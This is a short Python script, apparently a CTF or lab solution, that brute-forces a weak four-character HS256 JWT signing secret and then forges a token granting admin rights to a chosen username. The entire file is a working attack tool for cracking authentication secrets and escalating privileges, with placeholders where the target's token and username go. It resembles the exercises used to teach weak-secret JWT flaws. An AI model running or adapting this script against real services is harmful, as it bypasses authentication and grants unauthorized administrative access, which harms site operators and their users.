import jwt
import string
import itertools


jwt_token = "<Your JWT token>"


charset = string.ascii_lowercase + string.digits  # 'abcdefghijklmnopqrstuvwxyz0123456789'

def bruteforce_jwt_secret(token):
    for secret_tuple in itertools.product(charset, repeat=4):
        secret = "".join(secret_tuple)
        try:
            payload = jwt.decode(token, secret, algorithms=["HS256"])
            # Valid key
            print(f"[+] Secret key found : {secret}")
            print(f"Decode payload : {payload}")
            return secret
        except jwt.exceptions.InvalidSignatureError:
            # Invalid signature
            pass
        except jwt.exceptions.DecodeError:
            # Wrong key
            pass
    print("[-] Secret key not found")
    return None


def forge_admin_token(secret, username):
    payload = {"username": username, "admin": True}
    token = jwt.encode(payload, secret, algorithm="HS256")
    return token


if __name__ == "__main__":
    secret = bruteforce_jwt_secret(jwt_token)
    if secret:
        username = "<Username>"
        admin_token = forge_admin_token(secret, username)
        print(f"Token admin forgé : {admin_token}")

